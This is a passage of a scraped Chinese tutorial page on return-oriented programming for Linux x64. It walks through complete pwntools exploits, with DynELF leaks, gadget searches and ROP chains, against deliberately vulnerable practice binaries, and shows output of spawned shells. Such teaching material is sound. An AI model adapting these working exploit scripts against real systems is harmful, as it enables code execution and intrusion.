<!DOCTYPE HTML>

<!--
 ______________ 
< TUICOOL.COM >
 -------------- 
        \   ^__^
         \  (**)\__$__$__
            (__)\       )\/\
             U  ||------|
                ||     ||
-->
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tc-auth" content="MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451" />
  <meta content="authenticity_token" name="csrf-param" />
<meta content="kXqzXbeXutoqsg4w3VDjXHsJAWF1uju55CWdbulczKM=" name="csrf-token" />
    <title>
            一步一步学ROP之linux_x64篇 - 推酷
   </title>
    <meta name="description" content="一步一步学ROP之linux_x64篇"/>
  <link rel="shortcut icon" href="http://static0.tuicool.com/favicon.ico" type="image/x-icon" />
  <link href="http://static0.tuicool.com/images/icon114.png" rel="Bookmark" />
  <link rel="apple-touch-icon" sizes="57x57" href="http://static1.tuicool.com/images/icon57.png" /> 
  <link rel="apple-touch-icon" sizes="72x72" href="http://static2.tuicool.com/images/icon72.png" />  
  <link rel="apple-touch-icon" sizes="114x114" href="http://static0.tuicool.com/images/icon114.png" />    
  <link rel="apple-touch-icon" sizes="144x144" href="http://static1.tuicool.com/images/icon144.png"/>  
  <link href="http://asset.tuicool.com/assets/application-79535689d4effa45d2ea7ede6503dd7f.css" media="screen" rel="stylesheet" type="text/css" />
  <link href="http://static0.tuicool.com/assets/font-awesome.min.css" rel="stylesheet">
  <script src="http://asset.tuicool.com/assets/application-7edeeea3a20493861059090224f774ae.js" type="text/javascript"></script>

  <!--[if IE 7]>
  <link rel="stylesheet" href="http://assets.tuicool.com/assets/font-awesome-ie7.min.css">
  <![endif]--> 
    <script type="text/javascript" src="http://static2.tuicool.com/assets/tip.js?t=3"></script>
  
  <script type="text/javascript" src="http://static1.tuicool.com/assets/spin.min.js"></script>
<link rel="stylesheet" href="http://static0.tuicool.com/assets/github.css">

</head>
<body>
  
  <div id="header" class="navbar-fixed-top">
    <div class="container">
      <div class="navbar">
        <div class="navbar-inner">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"> 
            <span class="icon-bar"></span> 
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span> 
          </a>
          <a href="http://www.tuicool.com/" class="brand">推酷</a>        
        <nav class="nav-collapse collapse">
            <ul class="nav navbar primary-nav">                            
              <li class="active">
                <a href="http://www.tuicool.com/a/">
                  文章
                </a>
              </li>              
              <li class="">
                <a href="http://www.tuicool.com/sites">
                  站点
                </a>
              </li>
              <li class="">
                <a href="http://www.tuicool.com/topics">
                  主题
                </a>
              </li>
              <li class="">
                <a href="http://huodong.tuicool.com/">
                  活动
                </a>
              </li>
                  <li class="">
                    <a href="http://course.tuicool.com/">
                      公开课
                    </a>
                  </li>
              <li class="">
                <a href="http://www.tuicool.com/mobile">
                  APP
                </a>
              </li>
              <li class="dropdown  ">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">周刊 <b class="caret"></b></a>
                <ul class="dropdown-menu">
                  <li><a href="http://www.tuicool.com/mags">编程狂人</a></li>
                  <li><a href="http://www.tuicool.com/mags/design">设计匠艺</a></li> 
                  <li><a href="http://www.tuicool.com/mags/startup">创业周刊</a></li> 
                  <li><a href="http://www.tuicool.com/mags/tech">科技周刊</a></li>      
                  <li><a href="http://www.tuicool.com/mags/guru">Guru Weekly</a></li> 
                  <li><a href="http://www.tuicool.com/articles/weekly">一周拾遗</a></li>                  
                </ul>
              </li>
              
              </ul>
            <form class="navbar-search pull-left" action="http://www.tuicool.com/search">
              <input type="text" class="search-query span2" name="kw" placeholder="搜索">
            </form>
            <ul class="nav pull-right">
                          
                <li class="dropdown">         
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <img alt="wolfzhang" src="http://static0.tuicool.com/images/0m.png">
                    wolfzhang
                    <b class="caret"></b>
                  </a>
                  <ul class="dropdown-menu">
                    <li><a href='http://www.tuicool.com/user/462071652'>我的主页</a></li>
                    <li><a href='http://www.tuicool.com/articles/my'>我的收藏</a></li>
                    <li><a href="http://www.tuicool.com/settings">个人设置</a></li>           
                    <li><a href="http://www.tuicool.com/notifications">消息通知</a></li>
                    <li><a href="http://www.tuicool.com/bbs/go/issues">意见反馈</a></li>
                    <li><a href="http://www.tuicool.com/logout">退出</a></li>
                  </ul>
                </li>
            </ul>
          </nav>
        </div>
      </div>
  </div>   
</div>
  <div id ="flash_container" class="noPrint">    
  </div>
  
  <div class="container-fluid">  
      
<div class="row-fluid article_row_fluid">
    <div class="span8 contant article_detail_bg">
        <h1>一步一步学ROP之linux_x64篇</h1>
        <div class="article_meta">
            <div style="margin-bottom: 5px;">
            <span class="timestamp">时间&nbsp;2016-08-16 12:05:19
            </span>
            <span class="from">
                <i class="icon-globe"></i>
                    <a class="cut cut28 from" href="/sites/biau6bq" target="_blank">阿里聚安全
                    </a>
            </span>
            </div>
            <div class="source">
                <i style="float:left;">原文</i>&nbsp; 
                <a class="cut cut70" href="http://jaq.alibaba.com/community/art/show?articleid=473&amp;utm_source=tuicool&amp;utm_medium=referral" style="display:inline-block;">http://jaq.alibaba.com/community/art/show?articleid=473</a>
            </div>
            <div>
                <span>主题</span>
                <a href="/topics/11000069" target='_blank' >
                    <span class="new-label">Linux</span>
                </a>
                <a href="/topics/11130000" target='_blank' >
                    <span class="new-label">Python</span>
                </a>
            </div>
        </div>
        <div class="article_body" id="nei">
            <div> 
 <h2> <span> <strong>一、序</strong> </span> </h2> 
 <p> <span> <span> <span>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</span> </span> 。上次我们主要讨论了linux_x86的ROP攻击： </span> <span> <a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.11.MtR4jX&amp;articleid=403" target="_blank" rel="nofollow,noindex">《一步一步学ROP之linux_x86篇》</a> ， </span> <span>在这次的教程中我们会带来上一篇的补充以及linux_x64方面的ROP利用方法，欢迎大家继续学习。</span> </p> 
 <p>另外文中涉及代码可在我的github下载：https://github.com/zhengmin1989/ROP_STEP_BY_STEP</p> 
 <h2> <span> <span>二、Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</span> </span> </h2> 
 <p> <span>注意，这一节是上一篇文章的补充，还是讲的x86的ROP</span> 。 上次讲到了如何通过ROP绕过x86下DEP和ASLR防护。但是我们要事先得到目标机器上的libc.so或者具体的linux版本号才能计算出相应的offset。那么如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。 </p> 
 <p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p> 
 <p> <span>#!python</span> <br /> <span>def leak(address):</span> <br /> <span>&nbsp; &nbsp; payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)</span> <br /> <span>&nbsp; &nbsp; p.send(payload1)</span> <br /> <span>&nbsp; &nbsp; data = p.recv(4)</span> <br /> <span>&nbsp; &nbsp; print &quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))</span> <br /> <span>return data</span> <br /> </p> 
 <p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF('./level2'))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup('system', 'libc')来得到libc.so中system()在内存中的地址。</p> 
 <p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p> 
 <p> <span>#!bash</span> <br /> <span>$ readelf -S level2</span> <br /> <span>There are 30 section headers, starting at offset 0x1148:</span> <br /> <span>Section Headers:</span> <br /> <span>&nbsp; [Nr] Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Addr &nbsp; &nbsp; Off &nbsp; &nbsp;Size &nbsp; ES Flg Lk Inf Al</span> <br /> <span>……</span> <br /> <span>&nbsp; [23] .got.plt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PROGBITS &nbsp; &nbsp; &nbsp; &nbsp;08049ff4 000ff4 000024 04 &nbsp;WA &nbsp;0 &nbsp; 0 &nbsp;4</span> <br /> <span>&nbsp; [24] .data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROGBITS &nbsp; &nbsp; &nbsp; &nbsp;0804a018 001018 000008 00 &nbsp;WA &nbsp;0 &nbsp; 0 &nbsp;4</span> <br /> <span>&nbsp; [25] .bss &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NOBITS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0804a020 001020 000008 00 &nbsp;WA &nbsp;0 &nbsp; 0 &nbsp;4</span> <br /> <span>&nbsp; [26] .comment &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PROGBITS &nbsp; &nbsp; &nbsp; &nbsp;00000000 001020 00002a 01 &nbsp;MS &nbsp;0 &nbsp; 0 &nbsp;1</span> <br /> <span>……</span> </p> 
 <p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。PS：我们会在随后的章节中介绍如何用工具寻找更复杂的gadgets。</p> 
 <p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p> 
 <p>#!python</p> 
 <p>#!/usr/bin/env python</p> 
 <p>from pwn import *</p> 
 <p>elf = ELF('./level2')</p> 
 <p>plt_write = elf.symbols['write']</p> 
 <p>plt_read = elf.symbols['read']</p> 
 <p>vulfun_addr = 0x08048474</p> 
 <p>def leak(address):</p> 
 <p>payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)</p> 
 <p>p.send(payload1)</p> 
 <p>data = p.recv(4)</p> 
 <p>print &quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))</p> 
 <p>return data</p> 
 <p>p = process('./level2')</p> 
 <p>#p = remote('127.0.0.1', 10002)</p> 
 <p>d = DynELF(leak, elf=ELF('./level2'))</p> 
 <p>system_addr = d.lookup('system', 'libc')</p> 
 <p>print &quot;system_addr=&quot; + hex(system_addr)</p> 
 <p>bss_addr = 0x0804a020</p> 
 <p>pppr = 0x804855d</p> 
 <p>payload2 = 'a'*140 &nbsp;+ p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)&nbsp;</p> 
 <p>payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)</p> 
 <p>#ss = raw_input()</p> 
 <p>print &quot;\n###sending payload2 ...###&quot;</p> 
 <p>p.send(payload2)</p> 
 <p>p.send(&quot;/bin/sh\0&quot;)</p> 
 <p>p.interactive()</p> 
 <p>执行结果如下：</p> 
 <p> <span>#!bash</span> <br /> <span>$ python exp4.py&nbsp;</span> <br /> <span>[+] Started program './level2'</span> <br /> <span>0x8048000 =&gt; 7f454c46</span> <br /> <span>[+] Loading from '/home/mzheng/CTF/level2': Done</span> <br /> <span>0x8049ff8 =&gt; 18697eb7</span> <br /> <span>[+] Resolving 'system' in 'libc.so': 0xb77e6918</span> <br /> <span>0x8049f28 =&gt; 01000000</span> <br /> <span>0x8049f30 =&gt; 0c000000</span> <br /> <span>0x8049f38 =&gt; 0d000000</span> <br /> <span>0x8049f40 =&gt; f5feff6f</span> <br /> <span>0x8049f48 =&gt; 05000000</span> <br /> <span>0x8049f50 =&gt; 06000000</span> <br /> <span>0x8049f58 =&gt; 0a000000</span> <br /> <span>0x8049f60 =&gt; 0b000000</span> <br /> <span>0x8049f68 =&gt; 15000000</span> <br /> <span>0x8049f70 =&gt; 03000000</span> <br /> <span>0x8049f74 =&gt; f49f0408</span> <br /> <span>0xb77e691c =&gt; c5eb7db7</span> <br /> <span>0xb77debc5 =&gt; 0069203d</span> <br /> <span>0xb77e6924 =&gt; 086c7eb7</span> <br /> <span>0xb77e6c0c =&gt; c5eb7db7</span> <br /> <span>0xb77e6c14 =&gt; 58387cb7</span> <br /> <span>0xb77c385c =&gt; 38387cb7</span> <br /> <span>0xb77c3838 =&gt; 2f6c6962</span> <br /> <span>0xb77c383c =&gt; 2f693338</span> <br /> <span>0xb77c3840 =&gt; 362d6c69</span> <br /> <span>0xb77c3844 =&gt; 6e75782d</span> <br /> <span>0xb77c3848 =&gt; 676e752f</span> <br /> <span>0xb77c384c =&gt; 6c696263</span> <br /> <span>0xb77c3850 =&gt; 2e736f2e</span> <br /> <span>0xb77c3854 =&gt; 36000000</span> <br /> <span>0xb77c3858 =&gt; 007060b7</span> <br /> <span>0xb7607000 =&gt; 7f454c46</span> <br /> <span>0xb77c3860 =&gt; 7cdd7ab7</span> <br /> <span>0xb7607004 =&gt; 01010100</span> <br /> <span>0xb77add7c =&gt; 01000000</span> <br /> <span>0xb77add84 =&gt; 0e000000</span> <br /> <span>0xb77add8c =&gt; 0c000000</span> <br /> <span>0xb77add94 =&gt; 19000000</span> <br /> <span>0xb77add9c =&gt; 1b000000</span> <br /> <span>0xb77adda4 =&gt; 04000000</span> <br /> <span>0xb77addac =&gt; f5feff6f</span> <br /> <span>0xb77addb0 =&gt; b87160b7</span> <br /> <span>0xb77addb4 =&gt; 05000000</span> <br /> <span>0xb77addb8 =&gt; 584161b7</span> <br /> <span>0xb77addbc =&gt; 06000000</span> <br /> <span>0xb77addc0 =&gt; 38ae60b7</span> <br /> <span>0xb76071b8 =&gt; f3030000</span> <br /> <span>0xb76071bc =&gt; 09000000</span> <br /> <span>0xb76071c0 =&gt; 00020000</span> <br /> <span>0xb7608390 =&gt; 8e050000</span> <br /> <span>0xb7609fa8 =&gt; 8ae4ee1c</span> <br /> <span>0xb7610718 =&gt; 562f0000</span> <br /> <span>0xb76170ae =&gt; 73797374</span> <br /> <span>0xb76170b2 =&gt; 656d0074</span> <br /> <span>0xb761071c =&gt; 60f40300</span> <br /> <span>system_addr=0xb7646460</span> <br /> <span>###sending payload2 ...###</span> <br /> <span>[*] Switching to interactive mode</span> <br /> <span>$ whoami</span> <br /> <span>mzheng</span> <br /> </p> 
 <h2> <span> <strong>三、linux_64与linux_86的区别</strong> </span> </h2> 
 <p> <span>linux_64与linux_86的区别主要有两点：</span> <strong> <span>首先是内存地址的范围由32位变成了64位。</span> </strong> 但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。 <strong> <span>其次是函数参数的传递方式发生了改变</span> </strong> ，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。 </p> 
 <p>我们还是拿实际程序做例子进行讲解,level3.c内容如下：</p> 
 <p> <span>#!c</span> <br /> <span>#include &lt;stdio.h&gt;</span> <br /> <span>#include &lt;stdlib.h&gt;</span> <br /> <span>#include &lt;unistd.h&gt;</span> </p> 
 <p> <span> <br /> </span> <span>void callsystem()</span> <br /> <span>{</span> <br /> <span>&nbsp; &nbsp; system(&quot;/bin/sh&quot;);</span> <br /> <span>}</span> <br /> <span>void vulnerable_function() {</span> <br /> <span>&nbsp; &nbsp; char buf[128];</span> <br /> <span>&nbsp; &nbsp; read(STDIN_FILENO, buf, 512);</span> <br /> <span>}</span> <br /> <span>int main(int argc, char** argv) {</span> <br /> <span>&nbsp; &nbsp; write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span> <br /> <span>&nbsp; &nbsp; vulnerable_function();</span> <br /> <span>}</span> <br /> </p> 
 <p>我们打开ASLR并用如下方法编译：</p> 
 <p> <span>#!bash</span> <br /> <span>$ gcc -fno-stack-protector level3.c -o level3</span> <br /> </p> 
 <p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p> 
 <p> <span>#!bash</span> <br /> <span>$python pattern.py create 150 &gt; payload</span> <br /> <span>$ cat payload&nbsp;</span> <br /> <span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span> <br /> </p> 
 <p>然后运行gdb ./level3后输入这串字符串造成程序崩溃。</p> 
 <p> <span>#!bash</span> <br /> <span>(gdb) run &lt; payload</span> <br /> <span>Starting program: /home/mzheng/CTF/level3 &lt; payload</span> <br /> <span>Hello, World</span> </p> 
 <p> <span> <br /> </span> <span>Program received signal SIGSEGV, Segmentation fault.</span> <br /> <span>0x00000000004005b3 in vulnerable_function ()</span> <br /> </p> 
 <p>奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p> 
 <p>#!bash</p> 
 <p>(gdb) x/gx $rsp</p> 
 <p>0x7fffffffe188: 0x3765413665413565</p> 
 <p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p> 
 <p> <span>#!bash</span> <br /> <span>$ python pattern.py offset 0x3765413665413565</span> <br /> <span>hex pattern decoded as: e5Ae6Ae7</span> <br /> <span>136</span> <br /> </p> 
 <p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针。</p> 
 <p> <span>#!bash</span> <br /> <span>python -c 'print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;' &gt; payload</span> </p> 
 <p> <span> <br /> </span> <span>(gdb) run &lt; payload&nbsp;</span> <br /> <span>Starting program: /home/mzheng/CTF/level1 &lt; payload</span> <br /> <span>Hello, World</span> </p> 
 <p> <span> <br /> </span> <span>Program received signal SIGSEGV, Segmentation fault.</span> <br /> <span>0x0000464544434241 in ?? ()</span> <br /> </p> 
 <p>可以看到我们已经成功的控制了PC的指针了。所以最终的exp如下：</p> 
 <p>#!python</p> 
 <p>#!/usr/bin/env python</p> 
 <p>from pwn import *</p> 
 <p>elf = ELF('level3')</p> 
 <p>p = process('./level3')</p> 
 <p>#p = remote('127.0.0.1',10001)</p> 
 <p>callsystem = 0x0000000000400584</p> 
 <p>payload = &quot;A&quot;*136 + p64(callsystem)</p> 
 <p>p.send(payload)</p> 
 <p>p.interactive()</p> 
 <h2> <span> </span> </h2> 
 <p>四、使用工具寻找gadgets</p> 
 <p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p> 
 <p> <span> <strong> <span>ROPEME:</span> </strong> <span>https://github.com/packz/ropeme</span> </span> <br /> <span> <strong> <span>Ropper:</span> </strong> <span>https://github.com/sashs/Ropper</span> </span> <br /> <span> <strong> <span>ROPgadget:</span> </strong> <span>https://github.com/JonathanSalwan/ROPgadget/tree/master</span> </span> <br /> <span> <strong> <span>rp++:</span> </strong> <span>https://github.com/0vercl0k/rp</span> </span> </p> 
 <p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p> 
 <p>下面我们结合例子来讲解，首先来看一下目标程序level4.c的源码：</p> 
 <p> <span>#!c</span> <br /> <span>#include &lt;stdio.h&gt;</span> <br /> <span>#include &lt;stdlib.h&gt;</span> <br /> <span>#include &lt;unistd.h&gt;</span> <br /> <span>#include &lt;dlfcn.h&gt;</span> </p> 
 <p> <span> <br /> </span> <span>void systemaddr()</span> <br /> <span>{</span> <br /> <span>&nbsp; &nbsp; void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);</span> <br /> <span>&nbsp; &nbsp; printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));</span> <br /> <span>&nbsp; &nbsp; fflush(stdout);</span> <br /> <span>}</span> </p> 
 <p> <span> <br /> </span> <span>void vulnerable_function() {</span> <br /> <span>&nbsp; &nbsp; char buf[128];</span> <br /> <span>&nbsp; &nbsp; read(STDIN_FILENO, buf, 512);</span> <br /> <span>}</span> </p> 
 <p> <span> <br /> </span> <span>int main(int argc, char** argv) {</span> <br /> <span>&nbsp; &nbsp; systemaddr();</span> <br /> <span>&nbsp; &nbsp; write(1, &quot;Hello, World\n&quot;, 13);</span> <br /> <span>&nbsp; &nbsp; vulnerable_function();</span> <br /> <span>}</span> <br /> </p> 
 <p>编译方法：</p> 
 <p> <span>#!bash</span> <br /> <span>gcc -fno-stack-protector level4.c -o level4 -ldl</span> <br /> </p> 
 <p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4中所有pop ret的gadgets。</p> 
 <p> <span>#!bash</span> <br /> <span>$ ROPgadget --binary level4 --only &quot;pop|ret&quot;&nbsp;</span> <br /> <span>Gadgets information</span> <br /> <span>============================================================</span> <br /> <span>0x00000000004006d2 : pop rbp ; ret</span> <br /> <span>0x00000000004006d1 : pop rbx ; pop rbp ; ret</span> <br /> <span>0x0000000000400585 : ret</span> <br /> <span>0x0000000000400735 : ret 0xbdb8</span> <br /> </p> 
 <p>结果并不理想，因为程序比较小，在目标程序中并不能找到pop rdi; ret这个gadget。怎么办呢？解决方案是寻找libc.so中的gadgets。因为程序本身会load libc.so到内存中并且会打印system()的地址。所以当我们找到gadgets后可以通过system()计算出偏移量后调用对应的gadgets。</p> 
 <p> <span>#!bash</span> <br /> <span>$ ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</span> <br /> <span>0x000000000001f27d : pop rdi ; pop rbp ; ret</span> <br /> <span>0x00000000000205cd : pop rdi ; pop rbx ; pop rbp ; ret</span> <br /> <span>0x0000000000073033 : pop rdi ; pop rbx ; ret</span> <br /> <span>0x0000000000022a12 : pop rdi ; ret</span> <br /> </p> 
 <p>这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p> 
 <p> <span>#!bash</span> <br /> <span>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span> <br /> </p> 
 <p>另外，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链。</p> 
 <p> <span>#!bash</span> <br /> <span>$ ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</span> <br /> <span>0x000000000012da1d : call qword ptr [rdi]</span> <br /> <span>0x0000000000187113 : call qword ptr [rdx + rdi + 0x8f10001]</span> <br /> <span>0x00000000000f1f04 : call rdi</span> <br /> <span>0x00000000000f4739 : pop rax ; pop rdi ; call rax</span> <br /> <span>0x00000000000f473a : pop rdi ; call rax</span> <br /> </p> 
 <p>通过搜索结果我们发现，0x00000000000f4739 : pop rax ; pop rdi ; call rax也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p> 
 <p> <span>#!python</span> <br /> <span>payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span> <br /> </p> 
 <p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p> 
 <p> <span>#!python</span> <br /> <span>#!/usr/bin/env python</span> <br /> <span>from pwn import *</span> </p> 
 <p> <span> <br /> </span> <span>libc = ELF('libc.so.6')</span> </p> 
 <p> <span> <br /> </span> <span>p = process('./level4')</span> <br /> <span>#p = remote('127.0.0.1',10001)</span> <br /> <span>binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']</span> <br /> <span>print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)</span> </p> 
 <p> <span> <br /> </span> <span>pop_ret_offset = 0x0000000000022a12 - libc.symbols['system']</span> <br /> <span>print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)</span> </p> 
 <p> <span> <br /> </span> <span>#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols['system']</span> <br /> <span>#print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)</span> </p> 
 <p> <span> <br /> </span> <span>print &quot;\n##########receiving system addr##########\n&quot;</span> <br /> <span>system_addr_str = p.recvuntil('\n')</span> <br /> <span>system_addr = int(system_addr_str,16)</span> <br /> <span>print &quot;system_addr = &quot; + hex(system_addr)</span> </p> 
 <p> <span> <br /> </span> <span>binsh_addr = system_addr + binsh_addr_offset</span> <br /> <span>print &quot;binsh_addr = &quot; + hex(binsh_addr)</span> </p> 
 <p> <span> <br /> </span> <span>pop_ret_addr = system_addr + pop_ret_offset</span> <br /> <span>print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)</span> </p> 
 <p> <span> <br /> </span> <span>#pop_pop_call_addr = system_addr + pop_pop_call_offset</span> <br /> <span>#print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)</span> </p> 
 <p> <span> <br /> </span> <span>p.recv()</span> </p> 
 <p> <span> <br /> </span> <span>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)&nbsp;</span> </p> 
 <p> <span> <br /> </span> <span>#payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)&nbsp;</span> </p> 
 <p> <span> <br /> </span> <span>print &quot;\n##########sending payload##########\n&quot;</span> <br /> <span>p.send(payload)</span> </p> 
 <p> <span> <br /> </span> <span>p.interactive()</span> <br /> </p> 
 <p>运行结果如下：</p> 
 <p> <span>#!bash</span> <br /> <span>$ python exp6.py&nbsp;</span> <br /> <span>[+] Started program './level4'</span> <br /> <span>binsh_addr_offset = 0x134d41</span> <br /> <span>pop_ret_offset = -0x22d1e</span> </p> 
 <p> <span> <br /> </span> <span>##########receiving system addr##########</span> </p> 
 <p> <span> <br /> </span> <span>system_addr = 0x7f6f754d8730</span> <br /> <span>binsh_addr = 0x7f6f7560d471</span> <br /> <span>pop_ret_addr = 0x7f6f754b5a12</span> </p> 
 <p> <span> <br /> </span> <span>##########sending payload##########</span> </p> 
 <p> <span> <br /> </span> <span>[*] Switching to interactive mode</span> <br /> <span>$ whoami</span> <br /> <span>mzheng</span> <br /> </p> 
 <h2> <span> <strong>五、通用gadgets</strong> </span> </h2> 
 <p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p> 
 <p>为了方便大家学习x64下的ROP，level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p> 
 <p> <span>#!c</span> <br /> <span>#include &lt;stdio.h&gt;</span> <br /> <span>#include &lt;stdlib.h&gt;</span> <br /> <span>#include &lt;unistd.h&gt;</span> </p> 
 <p> <span> <br /> </span> <span>void vulnerable_function() {</span> <br /> <span>&nbsp; &nbsp; char buf[128];</span> <br /> <span>&nbsp; &nbsp; read(STDIN_FILENO, buf, 512);</span> <br /> <span>}</span> </p> 
 <p> <span> <br /> </span> <span>int main(int argc, char** argv) {</span> <br /> <span>&nbsp; &nbsp; write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span> <br /> <span>&nbsp; &nbsp; vulnerable_function();</span> <br /> <span>}</span> <br /> </p> 
 <p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p> 
